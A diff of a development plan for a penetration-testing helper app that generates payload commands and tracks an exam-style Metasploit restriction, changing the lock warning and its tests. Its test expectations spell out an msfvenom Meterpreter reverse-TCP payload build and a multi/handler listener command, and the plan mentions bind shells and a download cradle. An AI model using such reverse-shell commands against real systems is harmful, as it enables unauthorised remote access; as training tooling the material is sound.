@@ -26,7 +26,8 @@
 
 ## Plan calls (owner can overrule)
 
-- **Metasploit lock applies to Meterpreter only.** The owner's `Listeners.md` and `Payload-Generation-msfvenom.md` say a raw staged shell with `multi/handler` is unrestricted on the exam; only Meterpreter is limited to one machine. So the staged raw shell (`windows/x64/shell/reverse_tcp`) gets no lock line. This narrows spec §3.6, which put the line on all the new msfvenom payloads.
+- **Metasploit lock applies to Meterpreter only.** The owner's `Listeners.md` and `Payload-Generation-msfvenom.md` say a raw staged shell with `multi/handler` is unrestricted on the exam; only Meterpreter is limited to one machine. So the staged raw shell (`windows/x64/shell/reverse_tcp`) gets no lock line. This narrows spec §3.6, which put the line on all the new msfvenom payloads. *(Owner confirmed 2026-11-09.)*
+- **Only a real breach is guarded (owner decision 2026-11-09).** No host locked yet: the first Meterpreter use is allowed (it is what picks the Metasploit machine), so Raven shows a muted info line "Using Meterpreter here makes this your Metasploit machine" and copies at once. Locked to another host: amber line "Metasploit is locked to <host>" and the first copy is held back. Locked to this host, or outside exam-sim: nothing.
 - **Bind shells use their own port, `{BIND_PORT}`** (a fill field, default `4444`), not the LPORT chip, because LPORT means "your listener". The target is `{TARGET_IP}`, filled from the host's IP (as in the Arsenal's fill).
 - **"Failed here before" and "Needs X" become marks** (moved down, still selectable), not folds, so the "inference never folds a reliable" rule holds for every payload.
 - **Filter is one chip with a picker** (`Filter: off | base64 | base64 + ${IFS} | hex`, or `off | PowerShell -e` on Windows), not a toggle plus a second picker.
@@ -203,12 +204,12 @@
   - `msf-linux-x64-met-stageless` `linux/x64/meterpreter_reverse_tcp` elf `met.elf` (`meterpreter: true`)
   - `msf-php-met` `php/meterpreter/reverse_tcp` raw `met.php`, os `"any"` (`meterpreter: true`)
 - The `-p` part's explanation states staged vs stageless for each payload name (the existing text claims "underscore means stageless"; meterpreter_reverse_tcp is stageless and meterpreter/reverse_tcp staged — write both correctly). Existing stageless defs gain `"multi-handler"` as a second listener choice. The file header comment drops the "(exam rule)" sentence. Notes on new defs: "Catch it with multi/handler: nc and penelope can't serve a stage or speak Meterpreter."
-- Produces (msfLock.ts): `msfLockLine(input: { exam: boolean; def: PayloadDef; hostId: string | null; msfHostId: string | null; hostName: (id: string) => string }): string | null` → `null` unless `exam && def.meterpreter`; then `null` when `msfHostId === hostId`, `"Lock Metasploit to this host first"` when `msfHostId` is null, else `` `Metasploit is locked to ${hostName(msfHostId)}` ``.
+- Produces (msfLock.ts): `msfLockLine(input: { exam: boolean; def: PayloadDef; hostId: string | null; msfHostId: string | null; hostName: (id: string) => string }): { text: string; breach: boolean } | null` → `null` unless `exam && def.meterpreter`; then `null` when `msfHostId === hostId`; `{ text: "Using Meterpreter here makes this your Metasploit machine", breach: false }` when `msfHostId` is null; else `{ text: `` `Metasploit is locked to ${hostName(msfHostId)}` ``, breach: true }`. Only `breach: true` is a warning; the other is information.
 
 - [ ] **Step 1: Failing tests.**
   - Exact `text` and `listener` for each new def with `V` (e.g. `msf-win-x64-met-staged` → `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe -o met.exe`, listener `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.0.2.10; set LPORT 443; set ExitOnSession false; run -j"`).
   - `fit.test.ts`: `exam never folds a payload` — `rankPayloads(MSFVENOM, {…exam: true, os: "windows"}, null)` has every Windows and any-OS def in `fits`; no reason equals `"Not allowed in the exam"` anywhere (grep the source too: `expect(src).not.toContain("Not allowed in the exam")` reading `fit.ts`).
-  - `msfLock.test.ts`: the four cases (not exam → null; raw staged shell in exam → null; locked to this host → null; no lock → "Lock Metasploit to this host first"; locked to another → "Metasploit is locked to dc01").
+  - `msfLock.test.ts`: the five cases (not exam → null; raw staged shell in exam → null; locked to this host → null; no lock → `{ text: "Using Meterpreter here makes this your Metasploit machine", breach: false }`; locked to another → `{ text: "Metasploit is locked to dc01", breach: true }`).
 - [ ] **Step 2:** Run those files → FAIL.
 - [ ] **Step 3:** Implement; edit both spec docs' exam lines to: "No payload is banned; Metasploit (Meterpreter) is limited to one machine, tracked by the Metasploit lock. msfvenom and multi/handler with raw shells are unrestricted."
 - [ ] **Step 4:** Run → PASS; `npm test`.
@@ -339,12 +340,12 @@
 
 **Interfaces:**
 - Consumes: Task 4 `msfLockLine`, Task 6 `staleBuild`, `api.payloadBuildRecord`, `payloadBuildsKey`, Task 0 `attempt(..., { warn, warnKey })`, Task 1 `built.trigger`.
-- `usePayloadFit` loads `payloadBuilds` with `useQuery({ queryKey: payloadBuildsKey(eid), queryFn: () => api.payloadBuildsList(eid) })` and exposes `staleFor(def): { was; now } | null` (only for `def.bakesIp`) and `lockLine(def): string | null`. Remove `staleLines`.
+- `usePayloadFit` loads `payloadBuilds` with `useQuery({ queryKey: payloadBuildsKey(eid), queryFn: () => api.payloadBuildsList(eid) })` and exposes `staleFor(def): { was; now } | null` (only for `def.bakesIp`) and `lockLine(def): { text: string; breach: boolean } | null`. Remove `staleLines`.
 - **Build step vs trigger** (for a `bakesIp` def): if `def.prepare` exists, the build step is the prepare block and the trigger is the payload; otherwise (msfvenom, uploaded `kali` files) the payload is the build step and the trigger is `built.trigger` (uploaded) or nothing (msfvenom).
 - Recording: after a successful copy (↵, Copy button or ⌘↵) of a build step → `payloadBuildRecord({ engagementId, hostId, payloadId, lhost, lport, at: Date.now() })` and invalidate `payloadBuildsKey`. A trigger copy records only when `staleFor(def)` is null. No host → no call. A record failure shows in `status` (as log failures do) but never undoes the copy.
 - Prepare blocks go through the copy guard too (their own `copyKey` id `${def.id}:prepare`), so the unresolved check and recording apply.
 - Stale view: when `staleFor(def)` is non-null, the build step moves to the top with the amber line `Rebuild first: built with ${was}, now ${now}` above it; the trigger keeps its place but copies through `attempt(..., { warn: "Built with " + was + "; rebuild first", warnKey: was })`. Once the build step is copied (record written, query refetched) the line and the guard disappear.
-- Lock: when `lockLine(def)` is non-null, an amber line above the payload block, and the payload copy goes through `attempt(..., { warn: lockLine, warnKey: "msf-lock" })`.
+- Lock: when `lockLine(def)` is non-null, its text shows above the payload block. `breach: true` → amber (`text-warn`), and the payload copy goes through `attempt(..., { warn: text, warnKey: "msf-lock" })`. `breach: false` → muted (`text-muted`), and copying is unguarded.
 - Uploaded file view (def with `upload`): headings `Save as {FILE}` (content shells) or `Make {FILE} on Kali` (`upload.kali`), then `Trigger it`, a CommandBlock with `built.trigger.text` (placeholders highlighted, plain copy). In the Workbench (`numbered`) these are steps like the others. UPLOAD_PATH and TARGET_IP appear as fill fields (Task 7 fields already list template placeholders — extend `fieldTokens` to read `def.upload?.trigger` too).
 
 - [ ] **Step 1: Failing tests.**
@@ -354,7 +355,7 @@
     - `a changed LHOST blocks the trigger`: seed a nishang record with LHOST 192.0.2.10, set LHOST 192.0.2.20 → the amber line "Rebuild first: built with 192.0.2.10:443, now 192.0.2.20:443" is shown, the prepare block is first; ↵ on the cradle shows the warn hint and copies nothing; copying the prepare block records `192.0.2.20` and removes the line; ↵ on the cradle then copies at once.
     - `forcing past the block does not clear it`: second ↵ on the cradle copies but `payloadBuildRecord` is not called and the line stays.
     - `no host, no block`: same seed, host chip cleared → no line, no record call.
-    - `Meterpreter lock`: exam-sim engagement with `msfHostId` of another host → "Metasploit is locked to <name>" line; first ↵ guarded with that hint, second copies; `msf-win-x64-shell-staged` shows no line; outside exam-sim no line.
+    - `Meterpreter lock`: exam-sim engagement with `msfHostId` of another host → "Metasploit is locked to <name>" line; first ↵ guarded with that hint, second copies; no lock set → muted "Using Meterpreter here makes this your Metasploit machine" and the first ↵ copies; `msf-win-x64-shell-staged` shows no line; outside exam-sim no line.
 - [ ] **Step 2:** `npx vitest run src/test/features/payloads` → FAIL.
 - [ ] **Step 3:** Implement.
 - [ ] **Step 4:** `npm test && npm run typecheck && npm run lint` → PASS.
